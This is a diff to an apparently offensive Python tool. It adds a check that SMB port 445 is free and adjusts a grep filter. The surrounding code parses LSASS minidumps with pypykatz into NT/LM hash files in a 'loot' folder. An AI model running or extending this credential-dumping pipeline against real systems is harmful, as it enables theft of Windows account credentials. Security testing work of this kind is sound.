@@ -16,6 +16,7 @@ import argparse
 import threading
 import subprocess
 import collections
+import socket, errno
 import netifaces as ni
 from base64 import b64encode
 from datetime import datetime
@@ -1324,6 +1325,20 @@ def mt_execute(ip):  # multithreading requires a function
         logging.error('{}: {}'.format(ip, str(e)))
         pass
 
+def port445_check(interface_ip):
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock.bind((interface_ip, 445))
+    except socket.error as e:
+        if e.errno == errno.EADDRINUSE:
+            printnlog("{} Port 445 is already in use".format(red_minus))
+            sys.exit(0)
+        else:
+            # something else raised the socket.error exception
+            printnlog(str(e))
+
+    sock.close()
 
 # Process command-line arguments.
 if __name__ == '__main__':
@@ -1504,6 +1519,8 @@ if __name__ == '__main__':
                 local_ip = str(ni.ifaddresses(local_ip)[ni.AF_INET][0]['addr'])
                 printnlog("local IP => " + local_ip)
 
+        port445_check(local_ip)  # check if port 445 is in use
+
         if '-oe' not in sys.argv:  # why scan if we not gonna do anything
             addresses = do_ip(address, local_ip)  # gets a list of up hosts
 
@@ -1619,7 +1636,7 @@ if __name__ == '__main__':
             printnlog("\n[parsing files]")
             os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
             os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
-            os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
+            os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
 
             remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
             if remove_files.lower() == 'y':
